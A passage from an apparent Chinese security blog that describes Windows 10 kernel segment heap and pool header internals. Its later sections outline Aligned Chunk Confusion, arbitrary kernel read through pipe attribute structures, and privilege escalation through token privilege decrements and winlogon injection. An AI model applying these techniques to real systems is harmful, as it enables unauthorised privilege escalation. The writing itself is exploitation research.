class="hljs-number">3</span>] UChar<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">01</span>f UnitOffset : UChar<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">01</span>f UnitSize : UChar<br></code></pre></td></tr></table></figure><p>为了快速的寻找被释放的页范围。_HEAP_SEG_CONTEXT还维护了一个RB tree，每个都有一个signature成员，计算公式如下</p><p><code>Signature = Segment ^ SegContext ^ RtlpHpHeapGlobals ^ 0 xA2E64EADA2E64EAD ;</code></p><p>signature用于check他隶属于的_HEAP_SEG_CONTEXT结构体和对应的_SEGMENT_HEAP。</p><p>_HEAP_SEG_CONTEXT里的SegmentMask是用来帮助计算隶属于的段SegmentMask值为0xfffffffffff00000</p><p><code>Segment = Addr &amp; SegContext -&gt; SegmentMask ;</code></p><p>对应的PageRange也可以通过 _HEAP_SEG_CONTEXT里的UnitShift来计算，UnitShift值为12</p><p><code>PageRange = Segment + sizeof ( _HEAP_PAGE_RANGE_DESCRIPTOR ) * ( Addr - Segment ) &gt;&gt; SegContext -&gt; UnitShift ;</code></p><p>当Segment Backend被其他的backend使用时_HEAP_PAGE_RANGE_DESCRIPTOR中的RangeFlags会设置对应的位数来表明是哪个backend请求的。</p><h2 id="Variable-Size-Backend"><a href="#Variable-Size-Backend" class="headerlink" title="Variable Size Backend"></a>Variable Size Backend</h2><p>可变大小堆针对大小在512 B 和 128 KiB之间。目的是为了提供针对释放对快的便捷再利用。</p><p>Variable Size Backend context存储在_HEAP_VS_CONTEXT结构体中</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-attribute">0</span>: kd &gt; dt nt! _HEAP_VS_CONTEXT<br>+<span class="hljs-number">0</span> x000 <span class="hljs-attribute">Lock </span>: Uint8B<br>+<span class="hljs-number">0</span> x008 <span class="hljs-attribute">LockType </span>: _RTLP_HP_LOCK_TYPE<br>+<span class="hljs-number">0</span> x010 <span class="hljs-attribute">FreeChunkTree </span>: _RTL_RB_TREE<br>+<span class="hljs-number">0</span> x020 <span class="hljs-attribute">SubsegmentList </span>: _LIST_ENTRY<br>+<span class="hljs-number">0</span> x030 <span class="hljs-attribute">TotalCommittedUnits </span>: Uint8B<br>+<span class="hljs-number">0</span> x038 <span class="hljs-attribute">FreeCommittedUnits </span>: Uint8B<br>+<span class="hljs-number">0</span> x040 <span class="hljs-attribute">DelayFreeContext </span>: _HEAP_VS_DELAY_FREE_CONTEXT<br>+<span class="hljs-number">0</span> x080 <span class="hljs-attribute">BackendCtx </span>: Ptr64 Void<br>+<span class="hljs-number">0</span> x088 <span class="hljs-attribute">Callbacks </span>: _HEAP_SUBALLOCATOR_CALLBACKS<br>+<span class="hljs-number">0</span> x0b0 <span class="hljs-attribute">Config </span>: _RTL_HP_VS_CONFIG<br>+<span class="hljs-number">0</span> x0b4 <span class="hljs-attribute">Flags </span>: Uint4B<br></code></pre></td></tr></table></figure><p>被释放的堆块会被存放在FreeChunkTree中，这是个rb tree。当请求分配空间时，红黑树会返回他遍历到的与请求大小相等的的chunk或者是第一个比请求大小size大的chunk。</p><p>free chunk的头部是一个_HEAP_VS_CHUNK_FREE_HEADER结构体</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs crmsh"><span class="hljs-number">0</span>: kd &gt; dt nt! _HEAP_VS_CHUNK_FREE_HEADER<br>+<span class="hljs-number">0</span> x000 Header : _HEAP_VS_CHUNK_HEADER<br>+<span class="hljs-number">0</span> x000 OverlapsHeader : Uint8B<br>+<span class="hljs-number">0</span> x008 <span class="hljs-keyword">Node</span> <span class="hljs-title">: _RTL_BALANCED_NODE</span><br></code></pre></td></tr></table></figure><p>一旦chunk被找到，他会被分割成合适的大小，通过调用RtlpHpVsChunkSplit</p><p>所有被分配的chunk都会有个新头部_HEAP_VS_CHUNK_HEADER，如下所示</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">0:</span> <span class="hljs-string">kd</span> <span class="hljs-string">&gt;</span> <span class="hljs-string">dt</span> <span class="hljs-string">nt!</span> <span class="hljs-string">_HEAP_VS_CHUNK_HEADER</span><br><span class="hljs-string">+0</span> <span class="hljs-attr">x000 Sizes :</span> <span class="hljs-string">_HEAP_VS_CHUNK_HEADER_SIZE</span><br><span class="hljs-string">+0</span> <span class="hljs-attr">x008 EncodedSegmentPageOffset :</span> <span class="hljs-string">Pos</span> <span class="hljs-number">0</span><span class="hljs-string">,</span> <span class="hljs-number">8</span> <span class="hljs-string">Bits</span><br><span class="hljs-string">+0</span> <span class="hljs-attr">x008 UnusedBytes :</span> <span class="hljs-string">Pos</span> <span class="hljs-number">8</span><span class="hljs-string">,</span> <span class="hljs-number">1</span> <span class="hljs-string">Bit</span><br><span class="hljs-string">+0</span> <span class="hljs-attr">x008 SkipDuringWalk :</span> <span class="hljs-string">Pos</span> <span class="hljs-number">9</span><span class="hljs-string">,</span> <span class="hljs-number">1</span> <span class="hljs-string">Bit</span><br><span class="hljs-string">+0</span> <span class="hljs-attr">x008 Spare :</span> <span class="hljs-string">Pos</span> <span class="hljs-number">10</span><span class="hljs-string">,</span> <span class="hljs-number">22</span> <span class="hljs-string">Bits</span><br><span class="hljs-string">+0</span> <span class="hljs-attr">x008 AllocatedChunkBits :</span> <span class="hljs-string">Uint4B</span><br><span class="hljs-attr">0:</span> <span class="hljs-string">kd</span> <span class="hljs-string">&gt;</span> <span class="hljs-string">dt</span> <span class="hljs-string">nt!</span> <span class="hljs-string">_HEAP_VS_CHUNK_HEADER_SIZE</span><br><span class="hljs-string">+0</span> <span class="hljs-attr">x000 MemoryCost :</span> <span class="hljs-string">Pos</span> <span class="hljs-number">0</span><span class="hljs-string">,</span> <span class="hljs-number">16</span> <span class="hljs-string">Bits</span><br><span class="hljs-string">+0</span> <span class="hljs-attr">x000 UnsafeSize :</span> <span class="hljs-string">Pos</span> <span class="hljs-number">16</span><span class="hljs-string">,</span> <span class="hljs-number">16</span> <span class="hljs-string">Bits</span><br><span class="hljs-string">+0</span> <span class="hljs-attr">x004 UnsafePrevSize :</span> <span class="hljs-string">Pos</span> <span class="hljs-number">0</span><span class="hljs-string">,</span> <span class="hljs-number">16</span> <span class="hljs-string">Bits</span><br><span class="hljs-string">+0</span> <span class="hljs-attr">x004 Allocated :</span> <span class="hljs-string">Pos</span> <span class="hljs-number">16</span><span class="hljs-string">,</span> <span class="hljs-number">8</span> <span class="hljs-string">Bits</span><br><span class="hljs-string">+0</span> <span class="hljs-attr">x000 KeyUShort :</span> <span class="hljs-string">Uint2B</span><br><span class="hljs-string">+0</span> <span class="hljs-attr">x000 KeyULong :</span> <span class="hljs-string">Uint4B</span><br><span class="hljs-string">+0</span> <span class="hljs-attr">x000 HeaderBits :</span> <span class="hljs-string">Uint8B</span><br></code></pre></td></tr></table></figure><p>头部的所有成员都会与RtlpHpHeapGlobals还有chunk地址进行xor</p><p><code>Chunk -&gt; Sizes = Chunk -&gt; Sizes ^ Chunk ^ RtlpHpHeapGlobals ;</code></p><p><img src="image-20220424221352684.png" alt="image-20220424221352684"></p><h2 id="Low-Fragmentation-Heap-Backend"><a href="#Low-Fragmentation-Heap-Backend" class="headerlink" title="Low Fragmentation Heap Backend"></a>Low Fragmentation Heap Backend</h2><p>LFH为一些较小的分配准备。大小在1 B 到 512 B之间。</p><p>LFH Backend context存储在_HEAP_LFH_CONTEXT结构体中如下所示</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-attribute">0</span>: kd &gt; dt nt! _HEAP_LFH_CONTEXT<br>+<span class="hljs-number">0</span> x000 <span class="hljs-attribute">BackendCtx </span>: Ptr64 Void<br>+<span class="hljs-number">0</span> x008 <span class="hljs-attribute">Callbacks </span>: _HEAP_SUBALLOCATOR_CALLBACKS<br>+<span class="hljs-number">0</span> x030 <span class="hljs-attribute">AffinityModArray </span>: Ptr64 UChar<br>+<span class="hljs-number">0</span> x038 <span class="hljs-attribute">MaxAffinity </span>: UChar<br>+<span class="hljs-number">0</span> x039 <span class="hljs-attribute">LockType </span>: UChar<br>+<span class="hljs-number">0</span> x03a <span class="hljs-attribute">MemStatsOffset </span>: Int2B<br>+<span class="hljs-number">0</span> x03c <span class="hljs-attribute">Config </span>: _RTL_HP_LFH_CONFIG<br>+<span class="hljs-number">0</span> x040 <span class="hljs-attribute">BucketStats </span>: _HEAP_LFH_SUBSEGMENT_STATS<br>+<span class="hljs-number">0</span> x048 <span class="hljs-attribute">SubsegmentCreationLock </span>: Uint8B<br>+<span class="hljs-number">0</span> x080 <span class="hljs-attribute">Buckets </span>: [<span class="hljs-number">129</span>] Ptr64 _HEAP_LFH_BUCKET<br></code></pre></td></tr></table></figure><p>LFH最主要的特征使用了不同大小的bucket来防止内存碎片</p><p><img src="image-20220425212050409.png" alt="image-20220425212050409"></p><p>每个buckets都由段分配器来分配，位于_HEAP_LFH_CONTEXT的_HEAP_SUBALLOCATOR_CALLBACKS处</p><p>_HEAP_SUBALLOCATOR_CALLBACKS的一下成员会与LFH context地址还有RtlpHpHeapGlobals XOR</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">callbacks . Allocate = RtlpHpSegLfhAllocate ;<br>callbacks . Free = RtlpHpSegLfhVsFree ;<br>callbacks . Commit = RtlpHpSegLfhVsCommit ;<br>callbacks . Decommit = RtlpHpSegLfhVsDecommit ;<br>callbacks . ExtendContext = RtlpHpSegLfhExtendContext ;<br></code></pre></td></tr></table></figure><p>每个subsegment都有一个_HEAP_LFH_SUBSEGMENT头</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-attribute">0</span>: kd &gt; dt nt! _HEAP_LFH_SUBSEGMENT<br>+<span class="hljs-number">0</span> x000 <span class="hljs-attribute">ListEntry </span>: _LIST_ENTRY<br>+<span class="hljs-number">0</span> x010 <span class="hljs-attribute">Owner </span>: Ptr64 _HEAP_LFH_SUBSEGMENT_OWNER<br>+<span class="hljs-number">0</span> x010 <span class="hljs-attribute">DelayFree </span>: _HEAP_LFH_SUBSEGMENT_DELAY_FREE<br>+<span class="hljs-number">0</span> x018 <span class="hljs-attribute">CommitLock </span>: Uint8B<br>+<span class="hljs-number">0</span> x020 <span class="hljs-attribute">FreeCount </span>: Uint2B<br>+<span class="hljs-number">0</span> x022 <span class="hljs-attribute">BlockCount </span>: Uint2B<br>+<span class="hljs-number">0</span> x020 <span class="hljs-attribute">InterlockedShort </span>: Int2B<br>+<span class="hljs-number">0</span> x020 <span class="hljs-attribute">InterlockedLong </span>: Int4B<br>+<span class="hljs-number">0</span> x024 <span class="hljs-attribute">FreeHint </span>: Uint2B<br>+<span class="hljs-number">0</span> x026 <span class="hljs-attribute">Location </span>: UChar<br>+<span class="hljs-number">0</span> x027 <span class="hljs-attribute">WitheldBlockCount </span>: UChar<br>+<span class="hljs-number">0</span> x028 <span class="hljs-attribute">BlockOffsets </span>: _HEAP_LFH_SUBSEGMENT_ENCODED_OFFSETS<br>+<span class="hljs-number">0</span> x02c <span class="hljs-attribute">CommitUnitShift </span>: UChar<br>+<span class="hljs-number">0</span> x02d <span class="hljs-attribute">CommitUnitCount </span>: UChar<br>+<span class="hljs-number">0</span> x02e <span class="hljs-attribute">CommitStateOffset </span>: Uint2B<br>+<span class="hljs-number">0</span> x030 <span class="hljs-attribute">BlockBitmap </span>: [<span class="hljs-number">1</span>] Uint8B<br></code></pre></td></tr></table></figure><p>每个subsegment都会被分割成对应不同buckets大小的LFH块，为了知道哪个bucket正被使用，_HEAP_LFH_SUBSEGMENT里维护了一个bitmap</p><p><img src="image-20220425212500026.png" alt="image-20220425212500026"></p><p>当有分配请求时，LFH分配器会先寻找_HEAP_LFH_SUBSEGMENT中的FreeHint来找到最近被释放的block，然后回遍历BlockBitmap，每次32 blocks来寻找free的block。因为RtlpLowFragHeapRandomData表，这个遍历会很随机。也就是这个导致了first fit不再适用。</p><p>根据每个bucket的征用情况，可能会启用一个Affinity Slot机制，通过把每个子段专用于每个cpu来简化分配。</p><h2 id="Dynamic-Lookaside"><a href="#Dynamic-Lookaside" class="headerlink" title="Dynamic Lookaside"></a>Dynamic Lookaside</h2><p>0x200到0xF80大小之间的free chunk会被暂时的存放到lookaside list中，这个和win7的很像。当chunk存放到list里后，不会调用对应chunk的free处理函数。</p><p>lookaside list是个_RTL_DYNAMIC_LOOKASIDE结构体，位于 _SEGMENT_HEAP 的UserContext处。</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-attribute">0</span>: kd &gt; dt nt! _RTL_DYNAMIC_LOOKASIDE<br>+<span class="hljs-number">0</span> x000 <span class="hljs-attribute">EnabledBucketBitmap </span>: Uint8B<br>+<span class="hljs-number">0</span> x008 <span class="hljs-attribute">BucketCount </span>: Uint4B<br>+<span class="hljs-number">0</span> x00c <span class="hljs-attribute">ActiveBucketCount </span>: Uint4B<br>+<span class="hljs-number">0</span> x040 <span class="hljs-attribute">Buckets </span>: [<span class="hljs-number">64</span>] _RTL_LOOKASIDE<br></code></pre></td></tr></table></figure><p>每个free chunk会根据大小存放于_RTL_LOOKASIDE中</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs llvm"><span class="hljs-number">0</span>: kd &gt; dt nt! _RTL_LOOKASIDE<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">000</span> ListHead : _SLIST_HEADER<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">010</span> Depth : Uint<span class="hljs-number">2</span>B<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">012</span> MaximumDepth : Uint<span class="hljs-number">2</span>B<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">014</span> TotalAllocates : Uint<span class="hljs-number">4</span>B<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">018</span> AllocateMisses : Uint<span class="hljs-number">4</span>B<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">01</span><span class="hljs-keyword">c</span> TotalFrees : Uint<span class="hljs-number">4</span>B<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">020</span> FreeMisses : Uint<span class="hljs-number">4</span>B<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">024</span> LastTotalAllocates : Uint<span class="hljs-number">4</span>B<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">028</span> LastAllocateMisses : Uint<span class="hljs-number">4</span>B<br>+<span class="hljs-number">0</span> <span class="hljs-keyword">x</span><span class="hljs-number">02</span><span class="hljs-keyword">c</span> LastTotalFrees : Uint<span class="hljs-number">4</span>B<br></code></pre></td></tr></table></figure><p><img src="image-20220425213253958.png" alt="image-20220425213253958"></p><p>每次只会启用一个buckets。当一次分配请求完成时，lookaside对应的引用计数会更新。</p><h2 id="POOL-HEADER"><a href="#POOL-HEADER" class="headerlink" title="POOL_HEADER"></a>POOL_HEADER</h2><p>这个不多介绍了,主要提一下CacheAligned位。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">POOL_HEADER</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-keyword">char</span> PreviousSize ;<br><span class="hljs-keyword">char</span> PoolIndex ;<br><span class="hljs-keyword">char</span> BlockSize ;<br><span class="hljs-keyword">char</span> PoolType ;<br><span class="hljs-keyword">int</span> PoolTag ;<br>Ptr64 ProcessBilled ;<br>&#125;;<br></code></pre></td></tr></table></figure><p>随着内核池分配器的更新很多结构都没啥用了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">PoolHeader -&gt; PoolTag = PoolTag ;<br>PoolHeader -&gt; BlockSize = BucketBlockSize &gt;&gt; <span class="hljs-number">4</span>;<br>PoolHeader -&gt; PreviousSize = <span class="hljs-number">0</span>;<br>PoolHeader -&gt; PoolType = changedPoolType &amp; <span class="hljs-number">0</span> x6D | <span class="hljs-number">2</span>;<br></code></pre></td></tr></table></figure><p><code>PreviousSize</code> Unused and kept to 0.</p><p><code>PoolIndex</code> Unused.</p><p><code>BlockSize</code> Size of the chunk. Only used to eventually store the chunk in the Dynamic Lookaside list </p><p><code>PoolType</code> Usage did not change; used to keep the requested POOL_TYPE.</p><p><code>PoolTag</code> Usage did not change; used to keep the PoolTag.</p><p><code>ProcessBilled</code> Usage did not change; used to keep track of which process required the allocation, if the PoolType is PoolQuota (bit 3). The value is computed as follow:</p><p><code>ProcessBilled = chunk_addr ^ ExpPoolQuotaCookie ^ KPROCESS ;</code></p><p>可以发现和Quota Process Pointer Overwrite这个打法相关的结构体都没怎么变，除了ProcessBilled进行了xor。</p><p>下面讲讲CacheAligned，当PoolType中这个位被设置时，返回的内存会和cache line对齐，这个cache line大小取决于cpu一般都是0x40.</p><p>首先分配器会把请求大小加上ExpCacheLineSize</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( PoolType &amp; <span class="hljs-number">4</span> )<br>&#123;<br>request_alloc_size += ExpCacheLineSize ;<br><span class="hljs-keyword">if</span> ( request_alloc_size &gt; <span class="hljs-number">0</span> xFE0 )<br>        &#123;<br>        request_alloc_size -= ExpCacheLineSize ;<br>        PoolType = PoolType &amp; <span class="hljs-number">0</span> xFB ;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果新的大小不能放在一整个页，那CacheAligned位会被忽视，然后被分配的chunk必须遵循三个条件</p><p><code>— the final allocation address must be aligned on ExpCacheLineSize; </code></p><p><code>— the chunk must have a POOL_HEADER at the very beginning of the chunk; </code></p><p><code>— the chunk must have a POOL_HEADER at the address of allocation minus sizeof(POOL_HEADER)</code></p><p>所以这可能会导致有俩个pool header</p><p><img src="image-20220425214825410.png" alt="image-20220425214825410"></p><p>第一个header会在chunk开头，第二个会对齐。然后CacheAligned位会从第一个header移除，第二个header会有以下值</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">PreviousSize Used <span class="hljs-built_in">to</span> store <span class="hljs-keyword">the</span> <span class="hljs-built_in">offset</span> between <span class="hljs-keyword">the</span> <span class="hljs-literal">two</span> headers.<br>PoolIndex Unused.<br>BlockSize Size <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> allocated bucket <span class="hljs-keyword">in</span> <span class="hljs-keyword">first</span> POOL_HEADER, reduced<br>size <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> <span class="hljs-keyword">second</span> <span class="hljs-literal">one</span>.<br>PoolType As usual, but <span class="hljs-keyword">the</span> CacheAligned bit is <span class="hljs-built_in">set</span>.<br>PoolTag As usual, same <span class="hljs-keyword">on</span> <span class="hljs-title">both</span> <span class="hljs-title">POOL_HEADER</span>.<br>ProcessBilled Unused.<br></code></pre></td></tr></table></figure><p>主要看prevsize，会被用于定位第一个header，这就是我们可以利用的点。</p><p>值得一提的是，假如有足够的空间，第一个header后可能会紧跟着一个AlignedPoolHeader指针用于指向下一个header，这个指针会和ExpPoolQuotaCookie xor。</p><p><img src="image-20220425215405298.png" alt="image-20220425215405298"></p><p>可以看到随着poolheader在win10中的“削弱”，从攻击的角度去讲其实少了许多办法，像ProcessBilled这种指针都会进行加密，如果没有leak其实利用起来难度很大。</p><p>假如数据可控，最好的办法还是直接覆写poolheader然后溢出到下一个chunk结构体，这只需要找到一个带有指针且用户态提供读写api的结构体即可。就像31956里面用到的wnf结构体。</p><p>还有俩种攻击poolheader的办法一个是修改blocksize</p><p><img src="image-20220425220245300.png" alt="image-20220425220245300"></p><p>用于分配一个更大的堆块。</p><p>还有一个就是攻击PoolType也就是Aligned Chunk Confusion打法</p><p>free的chunk CacheAligned位被设置分配器会去根据prevsize找到first header</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( AlignedHeader -&gt; PoolType &amp; <span class="hljs-number">4</span> )<br>&#123;<br>OriginalHeader = ( QWORD ) AlignedHeader - AlignedHeader -&gt;<br>PreviousSize * <span class="hljs-number">0</span> x10 ;<br>OriginalHeader -&gt; PoolType |= <span class="hljs-number">4</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>Segment Heap推出后一些check被消除了，可能后续会被重新启用，因为之前提过first header后可能会紧跟这一个指针。这个指针没有在free的时候被check。</p><p><img src="image-20220426000620856.png" alt="image-20220426000620856"></p><h1 id="Aligned-Chunk-Confusion"><a href="#Aligned-Chunk-Confusion" class="headerlink" title="Aligned Chunk Confusion"></a>Aligned Chunk Confusion</h1><p>SSTIC2020那篇slides提到了这个打法，适用于paged or nonpaged pool</p><p>利用条件是溢出四个字节，且previoussize和pooltype这俩处可控。</p><p>简单介绍下这个打法。</p><p>最终利用的打法还是Quota Process Pointer Overwrite来达成任意地址减一（不了解的可以看我之前写的win7 kernel pool的博客），因为win8后多了mitigation。</p><p><code>ProcessBilled = addrof(EPROCESS) ⊕ addrof(Chunk) ⊕ ExpPoolQuotaCookie</code></p><p>所以在伪造eprocess前需要先有个任意读来leak。</p><p>slides里面以pagedpool为例用的结构体是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PipeAttribute</span> &#123;</span><br>LIST_ENTRY attribute_list ;<br><span class="hljs-keyword">char</span> * AttributeName ;<br><span class="hljs-keyword">uint64_t</span> AttributeValueSize ;<br><span class="hljs-keyword">char</span> * AttributeValue ;<br><span class="hljs-keyword">char</span> data [<span class="hljs-number">0</span>];<br>&#125;;<br></code></pre></td></tr></table></figure><p>和file ea差不多name用来查找，value用来存放。只要能修改value的指针就能达成任意地址读取，因为三环没有提供修改value的api所以任意地址写目前还不能。</p><p>下面介绍下Aligned Chunk</p><p><img src="image-20220424170843744.png" alt="image-20220424170843744"></p><p>当free时会根据prevsize去找到真正的pool header，在segment heap提出前会有很多check，现在都没了，详细可以看slides这边不多赘述。</p><p>所以要想利用现实设置好溢出堆块的pooltype为Aligned Chunk然后是prevsize，根据prevsize可以定位到我们伪造的fake header处</p><p><img src="image-20220424171234739.png" alt="image-20220424171234739"></p><p>下面调用NtfsControlFile来往fakechunk处分配一个pipeattribute结构体。接着利用再次调用NtfsControlFile来leak。</p><p><img src="image-20220424171727774.png" alt="image-20220424171727774"></p><p>然后把前面的pipeattr free后再分配一个并伪造listentry，伪造一个pipe再用户态地址</p><p><img src="image-20220424171816800.png" alt="image-20220424171816800"></p><p><img src="image-20220424171829312.png" alt="image-20220424171829312"></p><p>设置指针为之前leak的值即可。</p><p><img src="image-20220424171852826.png" alt="image-20220424171852826"></p><p>利用任意地址读可以leak出ExpPoolQuotaCookie，EPROCESS和token地址。</p><p><img src="image-20220424172010308.png" alt="image-20220424172010308"></p><p><img src="image-20220424172026586.png" alt="image-20220424172026586"></p><p>接着配合任意地址减一，注入代码到winlogon即可达成提权。</p><p>有几个注意点</p><p>构造的fake header的blocksize至少是0x21</p><p>因为0x200以下都会使用LFH，我们必须用vs分配器才能利用dynamic lookaside list所以至少0x200，对应的chunk大小是0x210.</p><p>另外，win7里面这个打法只需要减一次Privileges.Enabled在低权限一般都为0x0000000000800000，减一后是0x000000000007ffff有了SeDebugPrivilege。</p><p>但是在win10，内核会利用AdjustTokenPrivileges来check，Privileges.Present &amp; Privileges.Enabled</p><p>Privileges.Present在低权限下一般都是0x602880000然而</p><p><code>0x602880000 &amp; (1«20) == 0</code></p><p>所以如果在低权限下还需要再次利用一波，需要再次对Privileges.Present进行减一操作。</p><p>其次</p><p>漏洞块大小至少0x130，否则ghost会覆写漏洞快，会被分配到漏洞快之前。vs chunk和lfh chunk有一些区别，大部分vs chunk都会多一个vs header，这意味着需要溢出至少0x14字节而且需要修复vs header。并且要注意free的时候得保证不会触发merge操作。</p><h1 id="Non-Paged-POOL"><a href="#Non-Paged-POOL" class="headerlink" title="Non-Paged POOL"></a>Non-Paged POOL</h1><p><a href="https://github.com/vp777/Windows-Non-Paged-Pool-Overflow-Exploitation">https://github.com/vp777/Windows-Non-Paged-Pool-Overflow-Exploitation</a></p><p>这个打法就复杂很多了，针对的是nonpaged pool，这个洞之前我也看过，品相并不是很好。这个作者提出的打法适用于很多种情况可以达到任意读写。后续单独开篇文章写下。</p><p>SSTIC2020文章里也给出了一个结构体用于利用。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">PipeQueueEntry</span></span><br><span class="hljs-class">&#123;</span><br>LIST_ENTRY <span class="hljs-built_in">list</span> ;<br>IRP * linkedIRP ;<br>__int64 SecurityClientContext ;<br><span class="hljs-keyword">int</span> isDataInKernel ;<br><span class="hljs-keyword">int</span> remaining_bytes__ ;<br><span class="hljs-keyword">int</span> DataSize ;<br><span class="hljs-keyword">int</span> field_2C ;<br><span class="hljs-keyword">char</span> data [<span class="hljs-number">1</span>];<br>&#125;;<br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( PipeQueueEntry -&gt; isDataAllocated == <span class="hljs-number">1</span> )<br>data_ptr = ( PipeQueueEntry -&gt; linkedIRP -&gt; SystemBuffer );<br><span class="hljs-keyword">else</span><br>data_ptr = PipeQueueEntry -&gt; data ;<br>[...]<br>memmove (( <span class="hljs-keyword">void</span> *)( dst_buf + dst_len - cur_read_offset ), &amp; data_ptr [<br>PipeQueueEntry -&gt; DataSize - cur_entry_offset ], copy_size );<br></code></pre></td></tr></table></figure><p>当isDataInKernel被设置成1后，data不会直接存放在结构体后。会放在linkedIRP中，我们可以通过修改linkedIRP指针到用户态并设置好对应的SystemBuffer，就可以达到任意地址读。</p>]]></content>
    
    
    
    <tags>
      
      <tag>windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>关于32位与64位程序切换</title>
